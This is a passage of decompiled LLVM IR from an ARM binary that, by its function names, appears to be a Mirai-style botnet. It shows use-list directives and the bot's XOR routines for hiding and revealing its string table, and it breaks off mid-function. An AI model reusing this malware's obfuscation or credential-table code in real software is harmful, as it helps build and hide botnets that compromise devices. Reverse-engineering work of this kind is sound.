  uselistorder i32* %r0.global-to-local, { 80, 79, 82, 81, 83, 84, 85, 87, 86, 88, 89, 90, 120, 92, 91, 93, 95, 94, 96, 97, 98, 100, 99, 4, 124, 121, 122, 123, 0, 126, 125, 18, 20, 19, 21, 24, 22, 103, 130, 216, 218, 217, 101, 102, 104, 105, 107, 106, 108, 110, 109, 111, 23, 25, 27, 26, 1, 2, 5, 3, 7, 9, 11, 10, 8, 6, 13, 12, 14, 15, 16, 17, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 41, 40, 43, 42, 45, 44, 46, 47, 49, 48, 51, 50, 53, 52, 54, 55, 57, 56, 59, 58, 61, 60, 62, 63, 65, 64, 67, 66, 69, 68, 70, 71, 73, 72, 75, 74, 77, 76, 78, 113, 115, 114, 116, 112, 117, 118, 119, 127, 128, 129, 133, 131, 132, 138, 134, 135, 219, 136, 137, 139, 141, 140, 142, 147, 143, 146, 144, 145, 148, 150, 151, 149, 154, 152, 153, 157, 155, 156, 159, 158, 220, 215, 161, 160, 162, 164, 163, 166, 165, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 204, 203, 205, 210, 206, 207, 208, 209, 211, 212, 213, 214 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 122, 103, 104, 117, 118, 123, 124, 136, 215, 216, 26, 27, 29, 105, 220, 107, 109, 110, 210, 211, 212, 213, 214, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 217, 108, 14, 15, 20, 16, 17, 18, 19, 21, 22, 23, 24, 25, 28, 106, 30, 36, 31, 32, 33, 34, 35, 37, 38, 39, 40, 41, 42, 46, 47, 48, 43, 44, 45, 49, 50, 51, 52, 53, 54, 58, 59, 60, 55, 56, 57, 61, 62, 63, 64, 65, 66, 70, 71, 72, 67, 68, 69, 73, 74, 75, 76, 77, 78, 82, 83, 84, 79, 80, 81, 85, 86, 87, 88, 89, 90, 94, 95, 96, 91, 92, 93, 97, 98, 99, 100, 101, 102, 111, 112, 113, 114, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 219, 218, 137, 138, 139, 140, 141, 142, 143, 144, 145, 148, 150, 151, 149, 146, 147, 119, 120, 115, 152, 116, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 209, 185, 186, 187, 188, 189, 208, 190, 191, 192, 207, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 121, 206 }
  uselistorder i1* %cpsr_c.global-to-local, { 119, 101, 102, 120, 114, 115, 121, 133, 111, 208, 24, 25, 27, 103, 209, 104, 106, 107, 204, 205, 206, 207, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 210, 105, 12, 13, 18, 14, 15, 16, 17, 19, 20, 21, 22, 23, 26, 213, 28, 34, 29, 30, 31, 32, 33, 35, 36, 37, 38, 39, 40, 44, 45, 46, 41, 42, 43, 47, 48, 49, 50, 51, 52, 56, 57, 58, 53, 54, 55, 59, 60, 61, 62, 63, 64, 68, 69, 70, 65, 66, 67, 71, 72, 73, 74, 75, 76, 80, 81, 82, 77, 78, 79, 83, 84, 85, 86, 87, 88, 92, 93, 94, 89, 90, 91, 95, 96, 97, 98, 99, 100, 108, 109, 110, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 211, 212, 134, 135, 136, 137, 138, 139, 140, 143, 145, 146, 144, 141, 142, 116, 117, 112, 147, 113, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 203, 178, 179, 180, 181, 182, 202, 183, 184, 185, 201, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 118, 200 }
  uselistorder i32 ptrtoint (i16** @global_var_26114.115 to i32), { 4, 0, 1, 3, 2 }
  uselistorder i16** @global_var_23640.169, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_23640.169 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 4, 5, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 30, { 4, 0, 1, 5, 2, 3, 6 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), { 6, 23, 7, 24, 0, 25, 3, 26, 1, 27, 2, 28, 4, 29, 16, 30, 17, 31, 18, 32, 19, 33, 20, 34, 21, 35, 5, 36, 22, 37, 8, 38, 9, 39, 10, 40, 11, 41, 12, 42, 13, 43, 14, 44, 15, 45 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 13, 12, 11, 10, 9, 8, 7, 1, 25, 24, 28, 27, 26, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 6, 5, 4, 3, 2, 0 }
  uselistorder i8 37, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11 }
  uselistorder i8 34, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 36, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 18, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17, 22, 23, 24, 25 }
  uselistorder i8 35, { 4, 5, 6, 7, 0, 1, 2, 3, 8, 9, 10, 11, 20, 21, 22, 23, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27 }
  uselistorder i8 58, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 57, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 62, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 61, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14 }
  uselistorder i32 (i32)* @table_lock_val, { 27, 36, 35, 26, 37, 34, 33, 32, 31, 30, 29, 28, 25, 7, 6, 5, 4, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 24, 23, 22, 21, 20, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 23, 21, 24, 22, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 33, 34, 35, 36, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 11, 12, 13, 14, 15, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 (i32)* @table_unlock_val, { 38, 37, 46, 45, 44, 43, 42, 41, 40, 39, 36, 19, 18, 17, 16, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 35, 34, 33, 32, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 3, 4, 5, 0, 1, 2, 6, 7, 8, 9, 10 }
  uselistorder i8 2, { 0, 3, 2, 1 }
  uselistorder i8 5, { 12, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 11, 13, 10 }
  uselistorder i32 39, { 5, 0, 1, 6, 2, 7, 3, 8, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16 4873, { 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 54, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 223, { 2, 0, 1 }
  uselistorder i32 127, { 4, 5, 2, 6, 0, 7, 1, 8, 3, 9 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1a854.222 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1a80c.206 to i32), { 0, 20, 1, 21, 2, 22, 3, 23, 4, 24, 5, 25, 6, 26, 7, 27, 8, 28, 9, 29, 10, 30, 11, 31, 12, 32, 13, 33, 14, 34, 15, 35, 16, 36, 17, 37, 18, 38, 19, 39 }
  uselistorder i32 ptrtoint (i32* @global_var_1a7a4.200 to i32), { 0, 6, 1, 7, 2, 8, 3, 9, 4, 10, 5, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_1a7f8.198 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1a7ec.196 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1a7d4.192 to i32), { 0, 9, 1, 10, 2, 11, 3, 4, 5, 12, 6, 13, 7, 14, 8, 15 }
  uselistorder i8* @global_var_23635.187, { 1, 0 }
  uselistorder i16* @global_var_2362a.186, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 0, 2, 1, 3 }
  uselistorder i8 6, { 4, 5, 6, 7, 8, 9, 3, 10, 0, 11, 1, 2 }
  uselistorder i8 16, { 0, 1, 2, 4, 3, 12, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_23628.181 to i32), { 1, 2, 0, 3, 4 }
  uselistorder i8* @global_var_23634.182, { 1, 0 }
  uselistorder i8** @global_var_23614.178, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_23614.178 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1, 3, 4 }
  uselistorder i32 ()* @rand_next, { 66, 65, 64, 63, 62, 61, 60, 3, 2, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 1, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32* @global_var_26128.176, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 254, { 1, 2, 0 }
  uselistorder i32* @global_var_26124.174, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 2, 3, 7, 0, 1, 4, 5, 6, 8 }
  uselistorder i32* @global_var_23644.163, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_2610c.91, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_2610c.91 to i32), { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_2612c.161, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 5, 4, 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_10db8, { 1, 0 }
  uselistorder label %bb428, { 1, 0 }
  uselistorder label %dec_label_pc_10cd4, { 1, 0 }
  uselistorder label %dec_label_pc_10008.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008.backedge.thread528, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10008.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10ab0, { 1, 0 }
  uselistorder label %dec_label_pc_109e8, { 1, 0 }
  uselistorder label %dec_label_pc_109e4, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_109dc, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_109cc, { 1, 0 }
  uselistorder label %dec_label_pc_1095c, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread114, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10928, { 1, 0 }
  uselistorder label %.thread110, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10908, { 1, 0 }
  uselistorder label %dec_label_pc_108f4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_108b0, { 1, 0 }
  uselistorder label %dec_label_pc_108b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10890, { 5, 3, 4, 1, 0, 6, 2 }
  uselistorder label %dec_label_pc_1085c, { 1, 0 }
  uselistorder label %thread-pre-split103, { 1, 0 }
  uselistorder label %dec_label_pc_1080c, { 1, 0 }
  uselistorder label %dec_label_pc_10724, { 1, 0 }
  uselistorder label %dec_label_pc_10658, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10640, { 1, 0 }
  uselistorder label %dec_label_pc_104c4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_104ac, { 1, 0 }
  uselistorder label %dec_label_pc_103f0, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_103d8, { 1, 0 }
  uselistorder label %dec_label_pc_1031c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10304, { 1, 0 }
  uselistorder label %dec_label_pc_10248, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10230, { 1, 0 }
  uselistorder label %dec_label_pc_10110, { 6, 1, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb390, { 1, 0 }
  uselistorder label %bb388, { 1, 0 }
  uselistorder label %dec_label_pc_100d4, { 1, 0 }
  uselistorder label %dec_label_pc_1006c, { 1, 0 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_10020, { 1, 0 }
  uselistorder label %dec_label_pc_10010, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10010.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ffe8, { 1, 0 }
  uselistorder label %dec_label_pc_ff40, { 1, 0 }
  uselistorder label %bb384, { 1, 0 }
  uselistorder label %bb382, { 1, 0 }
  uselistorder label %bb380, { 1, 0 }
  uselistorder label %bb378, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_fe34.dec_label_pc_fe34_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fe14.dec_label_pc_fe14_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fe08, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_fe00, { 1, 0 }
  uselistorder label %dec_label_pc_fddc, { 1, 0 }
  uselistorder label %dec_label_pc_fdb8, { 1, 0 }
  uselistorder label %dec_label_pc_fc6c, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_fc58, { 1, 0 }
  uselistorder label %.thread39, { 1, 0 }
  uselistorder label %dec_label_pc_fae4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fac0, { 1, 0 }
  uselistorder label %dec_label_pc_fab4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fa90, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fa6c, { 1, 0 }
  uselistorder label %bb350, { 1, 0 }
  uselistorder label %dec_label_pc_fa18, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_f6f4, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_26134.272 to i32), i32* @r2, align 4
  %v3_10dc4 = mul i32 %arg1, 8
  %v2_10dc8 = add i32 %v3_10dc4, ptrtoint (i32* @global_var_26134.272 to i32)
  store i32 %v2_10dc8, i32* @r3, align 4
  %v2_10dcc = icmp eq i32* %arg2, null
  br i1 %v2_10dcc, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_10dd44 = inttoptr i32 %v2_10dc8 to i32*
  %v4_10dd45 = load i32, i32* %v3_10dd44, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_10dd0 = add i32 %v3_10dc4, add (i32 ptrtoint (i32* @global_var_26134.272 to i32), i32 4)
  %v3_10dd0 = inttoptr i32 %v2_10dd0 to i16*
  %v4_10dd0 = load i16, i16* %v3_10dd0, align 4
  %v5_10dd0 = zext i16 %v4_10dd0 to i32
  store i32 %v5_10dd0, i32* @r3, align 4
  %v3_10dd4 = inttoptr i32 %v2_10dc8 to i32*
  %v4_10dd4 = load i32, i32* %v3_10dd4, align 4
  store i32 %v5_10dd0, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_10dd46 = phi i32 [ %v4_10dd45, %.thread ], [ %v4_10dd4, %bb ]
  ret i32 %v4_10dd46

; uselistorder directives
  uselistorder i32 %v2_10dc8, { 1, 0, 2 }
  uselistorder i32 %v3_10dc4, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10dec = mul i32 %arg1, 8
  %v2_10df0 = add i32 %v3_10dec, ptrtoint (i32* @global_var_26134.272 to i32)
  %v2_10df4 = load i32, i32* @global_var_23484.275, align 4
  store i32 %v2_10df4, i32* @r1, align 4
  %v1_10df8 = add i32 %v3_10dec, add (i32 ptrtoint (i32* @global_var_26134.272 to i32), i32 4)
  %v2_10df8 = inttoptr i32 %v1_10df8 to i16*
  %v3_10df8 = load i16, i16* %v2_10df8, align 4
  %v3_10dfc = udiv i32 %v2_10df4, 256
  store i32 %v3_10dfc, i32* @r2, align 4
  %v2_10e00 = icmp eq i16 %v3_10df8, 0
  store i1 %v2_10e00, i1* @cpsr_z, align 1
  %v3_10e04 = udiv i32 %v2_10df4, 65536
  store i32 %v3_10e04, i32* @r3, align 4
  %v3_10e08 = load i32, i32* @r4, align 4
  store i32 %v3_10e08, i32* %stack_var_-16, align 4
  %v1_10e0c = urem i32 %v3_10dfc, 256
  store i32 %v1_10e0c, i32* %r6.global-to-local, align 4
  %v1_10e10 = urem i32 %v3_10e04, 256
  store i32 %v1_10e10, i32* %r5.global-to-local, align 4
  %v3_10e14 = udiv i32 %v2_10df4, 16777216
  store i32 %v3_10e14, i32* %r4.global-to-local, align 4
  %v1_10e18 = urem i32 %v2_10df4, 256
  store i32 %v1_10e18, i32* %lr.global-to-local, align 4
  br i1 %v2_10e00, label %dec_label_pc_10e74, label %dec_label_pc_10e20

dec_label_pc_10e20:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_10e24 = inttoptr i32 %v2_10df0 to i32*
  br label %dec_label_pc_10e24

dec_label_pc_10e24:                               ; preds = %dec_label_pc_10e24.dec_label_pc_10e24_crit_edge, %dec_label_pc_10e20
  %v0_10e2c = phi i32 [ %v0_10e2c.pre, %dec_label_pc_10e24.dec_label_pc_10e24_crit_edge ], [ %v1_10e18, %dec_label_pc_10e20 ]
  %v2_10e30 = phi i32 [ %v1_10e68, %dec_label_pc_10e24.dec_label_pc_10e24_crit_edge ], [ 0, %dec_label_pc_10e20 ]
  %v2_10e24 = load i32, i32* %v1_10e24, align 4
  %v2_10e28 = add i32 %v2_10e24, %v2_10e30
  %v3_10e28 = inttoptr i32 %v2_10e28 to i8*
  %v4_10e28 = load i8, i8* %v3_10e28, align 1
  %v6_10e28 = zext i8 %v4_10e28 to i32
  %v2_10e2c = xor i32 %v6_10e28, %v0_10e2c
  %v1_10e30 = trunc i32 %v2_10e2c to i8
  store i8 %v1_10e30, i8* %v3_10e28, align 1
  %v2_10e34 = load i32, i32* %v1_10e24, align 4
  %v0_10e38 = load i32, i32* @ip, align 4
  %v2_10e38 = add i32 %v0_10e38, %v2_10e34
  %v3_10e38 = inttoptr i32 %v2_10e38 to i8*
  %v4_10e38 = load i8, i8* %v3_10e38, align 1
  %v6_10e38 = zext i8 %v4_10e38 to i32
  %v0_10e3c = load i32, i32* %r6.global-to-local, align 4
  %v2_10e3c = xor i32 %v0_10e3c, %v6_10e38
  %v1_10e40 = trunc i32 %v2_10e3c to i8
  store i8 %v1_10e40, i8* %v3_10e38, align 1
  %v2_10e44 = load i32, i32* %v1_10e24, align 4
  %v0_10e48 = load i32, i32* @ip, align 4
  %v2_10e48 = add i32 %v0_10e48, %v2_10e44
  %v3_10e48 = inttoptr i32 %v2_10e48 to i8*
  %v4_10e48 = load i8, i8* %v3_10e48, align 1
  %v6_10e48 = zext i8 %v4_10e48 to i32
  %v0_10e4c = load i32, i32* %r5.global-to-local, align 4
  %v2_10e4c = xor i32 %v0_10e4c, %v6_10e48
  %v1_10e50 = trunc i32 %v2_10e4c to i8
  store i8 %v1_10e50, i8* %v3_10e48, align 1
  %v2_10e54 = load i32, i32* %v1_10e24, align 4
  store i32 %v2_10e54, i32* @r1, align 4
  %v0_10e58 = load i32, i32* @ip, align 4
  %v2_10e58 = add i32 %v0_10e58, %v2_10e54
  %v3_10e58 = inttoptr i32 %v2_10e58 to i8*
  %v4_10e58 = load i8, i8* %v3_10e58, align 1
  %v6_10e58 = zext i8 %v4_10e58 to i32
  %v0_10e5c = load i32, i32* %r4.global-to-local, align 4
  %v2_10e5c = xor i32 %v0_10e5c, %v6_10e58
  store i32 %v2_10e5c, i32* @r3, align 4
  %v1_10e60 = trunc i32 %v2_10e5c to i8
  store i8 %v1_10e60, i8* %v3_10e58, align 1
  %v3_10e64 = load i16, i16* %v2_10df8, align 4
  %v4_10e64 = zext i16 %v3_10e64 to i32
  store i32 %v4_10e64, i32* @r2, align 4
  %v0_10e68 = load i32, i32* @ip, align 4
  %v1_10e68 = add i32 %v0_10e68, 1
  store i32 %v1_10e68, i32* @ip, align 4
  %v9_10e6c = icmp eq i32 %v4_10e64, %v1_10e68
  store i1 %v9_10e6c, i1* @cpsr_z, align 1
  %v8_10e70 = icmp sgt i32 %v4_10e64, %v1_10e68
  br i1 %v8_10e70, label %dec_label_pc_10e24.dec_label_pc_10e24_crit_edge, label %dec_label_pc_10e74.loopexit

dec_label_pc_10e24.dec_label_pc_10e24_crit_edge:  ; preds = %dec_label_pc_10e24
  %v0_10e2c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10e24

dec_label_pc_10e74.loopexit:                      ; preds = %dec_label_pc_10e24
  %v2_10e74.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10e74

dec_label_pc_10e74:                               ; preds = %dec_label_pc_10e74.loopexit, %entry
  %v2_10e74 = phi i32 [ %v2_10e74.pre, %dec_label_pc_10e74.loopexit ], [ %v3_10e08, %entry ]
  store i32 %v2_10e74, i32* @r4, align 4
  ret i32 %v2_10df0

; uselistorder directives
  uselistorder i32 %v1_10e68, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10e18, { 1, 0 }
  uselistorder i32 %v3_10e04, { 1, 0 }
  uselistorder i32 %v3_10dfc, { 1, 0 }
  uselistorder i32 %v2_10df4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_10dec, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10e8c = mul i32 %arg1, 8
  %v2_10e90 = add i32 %v3_10e8c, ptrtoint (i32* @global_var_26134.272 to i32)
  %v2_10e94 = load i32, i32* @global_var_23484.275, align 4
  %v1_10e98 = add i32 %v3_10e8c, add (i32 ptrtoint (i32* @global_var_26134.272 to i32), i32 4)
  %v2_10e98 = inttoptr i32 %v1_10e98 to i16*
  %v3_10e98 = load i16, i16* %v2_10e98, align 4
  %v3_10e9c = udiv i32 %v2_10e94, 256
  %v2_10ea0 = icmp eq i16 %v3_10e98, 0
  %v3_10ea4 = udiv i32 %v2_10e94, 65536
  store i32 %v3_10ea4, i32* @r3, align 4
  %v3_10ea8 = load i32, i32* @r4, align 4
  store i32 %v3_10ea8, i32* %stack_var_-16, align 4
  %v1_10eac = urem i32 %v3_10e9c, 256
  store i32 %v1_10eac, i32* %r6.global-to-local, align 4
  %v1_10eb0 = urem i32 %v3_10ea4, 256
  store i32 %v1_10eb0, i32* %r5.global-to-local, align 4
  %v3_10eb4 = udiv i32 %v2_10e94, 16777216
  store i32 %v3_10eb4, i32* %r4.global-to-local, align 4
  %v1_10eb8 = urem i32 %v2_10e94, 256
  store i32 %v1_10eb8, i32* %lr.global-to-local, align 4
  br i1 %v2_10ea0, label %dec_label_pc_10f14, label %dec_label_pc_10ec0

dec_label_pc_10ec0:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_10ec4 = inttoptr i32 %v2_10e90 to i32*
  br label %dec_label_pc_10ec4

dec_label_pc_10ec4:                               ; preds = %dec_label_pc_10ec4.dec_label_pc_10ec4_crit_edge, %dec_label_pc_10ec0
  %v0_10ecc = phi i32 [ %v0_10ecc.pre, %dec_label_pc_10ec4.dec_label_pc_10ec4_crit_edge ], [ %v1_10eb8, %dec_label_pc_10ec0 ]
  %v2_10ed0 = phi i32 [ %v1_10f08, %dec_label_pc_10ec4.dec_label_pc_10ec4_crit_edge ], [ 0, %dec_label_pc_10ec0 ]
  %v2_10ec4 = load i32, i32* %v1_10ec4, align 4
  %v2_10ec8 = add i32 %v2_10ec4, %v2_10ed0
  %v3_10ec8 = inttoptr i32 %v2_10ec8 to i8*
  %v4_10ec8 = load i8, i8* %v3_10ec8, align 1
  %v6_10ec8 = zext i8 %v4_10ec8 to i32
  %v2_10ecc = xor i32 %v6_10ec8, %v0_10ecc
  %v1_10ed0 = trunc i32 %v2_10ecc to i8
  store i8 %v1_10ed0, i8* %v3_10ec8, align 1
  %v2_10ed4 = load i32, i32* %v1_10ec4, align 4
  %v0_10ed8 = load i32, i32* @ip, align 4
  %v2_10ed8 = add i32 %v0_10ed8, %v2_10ed4
  %v3_10ed8 = inttoptr i32 %v2_10ed8 to i8*
  %v4_10ed8 = load i8, i8* %v3_10ed8, align 1
  %v6_10ed8 = zext i8 %v4_10ed8 to i32
  %v0_10edc = load i32, i32* %r6.global-to-local, align 4
  %v2_10edc = xor i32 %v0_10edc, %v6_10ed8
  %v1_10ee0 = trunc i32 %v2_10edc to i8
  store i8 %v1_10ee0, i8* %v3_10ed8, align 1
  %v2_10ee4 = load i32, i32* %v1_10ec4, align 4
  %v0_10ee8 = load i32, i32* @ip, align 4
  %v2_10ee8 = add i32 %v0_10ee8, %v2_10ee4
  %v3_10ee8 = inttoptr i32 %v2_10ee8 to i8*
  %v4_10ee8 = load i8, i8* %v3_10ee8, align 1
  %v6_10ee8 = zext i8 %v4_10ee8 to i32
  %v0_10eec = load i32, i32* %r5.global-to-local, align 4
  %v2_10eec = xor i32 %v0_10eec, %v6_10ee8
  %v1_10ef0 = trunc i32 %v2_10eec to i8
  store i8 %v1_10ef0, i8* %v3_10ee8, align 1
  %v2_10ef4 = load i32, i32* %v1_10ec4, align 4
  %v0_10ef8 = load i32, i32* @ip, align 4
